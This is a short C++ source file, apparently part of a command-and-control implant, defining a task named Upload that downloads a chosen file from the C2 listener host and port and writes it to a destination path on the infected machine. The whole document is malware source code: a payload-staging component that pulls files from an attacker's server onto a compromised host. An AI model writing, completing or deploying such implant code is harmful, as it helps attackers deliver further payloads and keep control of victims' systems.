#include "core/task.hpp"

namespace Task
{
    std::wstring Upload(HINTERNET hConnect, const std::wstring& wSrc, const std::wstring& wDest)
    {
        std::string sSrc = Utils::Convert::UTF8Encode(wSrc);

        // Download a specified file from the C2 server.
        BOOL bResult = System::Http::DownloadFile(
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_DOWNLOAD_W,
            wSrc,
            wDest
        );
        if (!bResult)
        {
            return L"Error: Could not download a file.";
        }

        return wDest.c_str();
    }
}